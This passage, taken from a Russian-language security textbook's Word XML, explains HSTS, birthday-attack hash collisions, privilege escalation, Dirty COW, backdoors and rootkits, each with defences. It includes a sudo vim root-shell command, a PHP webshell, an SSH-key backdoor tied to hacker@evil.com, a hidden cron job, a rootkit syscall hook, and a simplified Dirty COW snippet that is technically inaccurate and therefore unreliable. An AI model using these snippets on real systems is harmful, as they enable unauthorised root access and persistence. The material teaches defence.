        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отключить устаревшие протоколы** (SSL 3.0, TLS 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HSTS (HTTP Strict Transport Security)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Strict-Transport-Security: max-age=31536000; includeSubDomains</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Браузер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>принудительно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> использует HTTPS, запрещает откат на HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Birthday Attack (Атака днями рождения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Эксплуатация </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>парадокса дней рождения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для поиска </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>коллизий хеш-функций</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Парадокс дней рождения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В группе из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>23 человек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> вероятность совпадения дня рождения ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>50%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (а не 23/365 = 6%, как кажется интуитивно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение к хеш-функциям</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для хеш-функции с выходом </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n бит</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всего возможных хешей: **2ⁿ**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Коллизию можно найти за **√(2ⁿ) = 2^(n/2)** попыток</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MD5: 128 бит → коллизию найдём за **2⁶⁴ ≈ 10¹⁹** операций (уже реально на практике, найдены коллизии)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SHA-1: 160 бит → коллизию найдём за **2⁸⁰** операций (найдена в 2017 году, Google/CWI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SHA-256: 256 бит → коллизию найдём за **2¹²⁸** операций (пока нереально)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер создаёт **два документа** (легитимный и вредоносный) с **одинаковым хешем**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляет легитимный на подпись</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>После подписи подменяет на вредоносный (подпись остаётся валидной!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — SHAttered (2017)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Google нашла коллизию SHA-1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Два разных PDF-файла → **одинаковый SHA-1 хеш**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вычисление заняло **6,500 лет процессорного времени**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Это убило SHA-1: теперь все переходят на SHA-256</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не используй **MD5/SHA-1** для безопасности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используй **SHA-256, SHA-3, BLAKE2**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.4. Повышение привилегий: Как обычный юзер становится админом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Privilege Escalation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — получение </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>более высоких привилегий</w:t>
      </w:r>
      <w:r>
        <w:t>, чем изначально предоставлены.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Horizontal Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Доступ к данным </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>другого пользователя</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> того же уровня (не админа).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Пользователь A читает email пользователя B (оба обычные юзеры).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IDOR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (см. раздел 9.6.2).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vertical Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Обычный пользователь получает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>admin-доступ</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Способы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация уязвимости ядра** (kernel exploit):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость в драйвере/syscall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выполнение кода в kernel mode → root</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Sudo misconfiguration**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Проверка разрешённых sudo-команд</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   (ALL) NOPASSWD: /usr/bin/vim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эксплойт</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   sudo vim -c ':!bash'  # Запускаем bash из vim с правами root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**SUID-бинарники** (файлы с битом SUID → выполняются с правами владельца):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Поиск SUID-бинарников</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   find / -perm -4000 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   # Нашли:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   -rwsr-xr-x 1 root root /usr/bin/old_binary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Если `old_binary` уязвим (buffer overflow, command injection) → RCE с правами root.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Dirty COW (2016)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CVE-2016-5195</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — уязвимость в Linux kernel (существовала </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>9 лет</w:t>
      </w:r>
      <w:r>
        <w:t>, с 2007 года).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Race condition в механизме **Copy-On-Write** (COW)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позволяла записать в **read-only файлы** (например, `/etc/passwd`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обычный пользователь → **root** за секунды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эксплойт</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>// Dirty COW эксплойт (упрощённо)</w:t>
        <w:br/>
        <w:t>int fd = open("/etc/passwd", O_RDONLY);  // Открываем read-only</w:t>
        <w:br/>
        <w:t>void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Race condition: одновременно читаем и пишем в map</w:t>
        <w:br/>
        <w:t>while (1) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    write(fd, "root::0:0::/root:/bin/bash\n", 27);  // Перезаписываем пароль root на пустой</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t>: Вход как `root` без пароля.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновлять ядро** (патч вышел в течение недели)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SELinux/AppArmor** (ограничение доступа к syscalls)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.5. Backdoor и Rootkit: Как хакеры остаются в системе навсегда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Backdoor (Бэкдор, Чёрный ход)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Скрытый </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>метод обхода аутентификации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для получения доступа к системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Легальные бэкдоры** (созданы разработчиком):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Master password** в софте (для восстановления доступа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Debug-интерфейс**, оставленный в production (telnet, SSH с дефолтным паролем)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нелегальные бэкдоры** (созданы хакером после взлома):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Webshell** (PHP/JSP файл на веб-сервере):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     &lt;?php system($_GET['cmd']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     URL: `http://site.com/shell.php?cmd=whoami` → выполнение команд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SSH-ключ** в `/root/.ssh/authorized_keys`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     echo "ssh-rsa AAAAB3NzaC1yc2EAAAA... hacker@evil.com" &gt;&gt; /root/.ssh/authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     Хакер может войти по SSH без пароля.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Cron job** (периодический запуск backdoor):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     */5 * * * * /tmp/.hidden/backdoor.sh  # Каждые 5 минут</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Juniper backdoor (2015)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В коде ScreenOS (Juniper Networks) нашли </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>два бэкдора</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Unauthorised VPN decryption**: Juniper (или АНБ) могли расшифровывать VPN-трафик</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Master password**: `&lt;&lt;&lt; %s(un='%s') = %u` → вход в систему без авторизации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как попало?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Неясно: либо инсайдер, либо взлом, либо спецслужбы. Затронуты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>тысячи устройств</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> по всему миру.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Code review** (проверка кода на backdoors)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Integrity monitoring** (контроль целостности файлов):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  # AIDE (Advanced Intrusion Detection Environment)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  aide --check  # Проверяет, изменились ли системные файлы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Регулярный аудит** SSH-ключей, cron jobs, systemd services</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Rootkit (Руткит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Набор инструментов для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>скрытия присутствия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> злоумышленника в системе (скрывает процессы, файлы, сетевые соединения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**User-mode rootkit** (работает в пространстве пользователя):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подменяет системные утилиты: `ps`, `ls`, `netstat`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: заменяет `/bin/ps` → не показывает процесс хакера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Kernel-mode rootkit** (работает в ядре):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модифицирует ядро Linux (LKM — Loadable Kernel Module)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Hooking системных вызовов** (перехват `open()`, `read()`, `write()`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   // Rootkit перехватывает syscall read()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   asmlinkage long hooked_read(unsigned int fd, char __user *buf, size_t count) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       long ret = original_read(fd, buf, count);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       if (strstr(buf, "hacker_process")) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">           // Удаляем строку с именем процесса хакера из вывода ps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">           remove_line(buf, "hacker_process");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       return ret;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Bootkit** (заражение загрузчика):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модифицирует **MBR (Master Boot Record)** или **UEFI firmware**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Загружается **до ОС** → обходит антивирусы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Sony BMG rootkit (2005)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Sony встроила rootkit в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>музыкальные CD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (защита от копирования):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При вставке CD в Windows → автоматически устанавливается rootkit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rootkit скрывал файлы, начинающиеся с `$sys$`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уязвимость**: любой вирус мог назвать себя `$sys$virus.exe` → стать невидимым</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
